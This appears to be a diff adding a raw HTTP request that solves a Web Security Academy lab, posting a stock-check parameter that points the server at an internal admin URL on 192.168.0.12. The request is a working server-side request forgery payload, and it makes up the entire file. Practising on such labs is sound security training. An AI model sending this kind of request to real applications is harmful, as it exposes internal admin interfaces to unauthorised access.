@@ -1,0 +1,6 @@
+POST /product/stock HTTP/1.1
+Host: <lab-url>.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 39
+
+stockApi=http://192.168.0.12:8080/admin
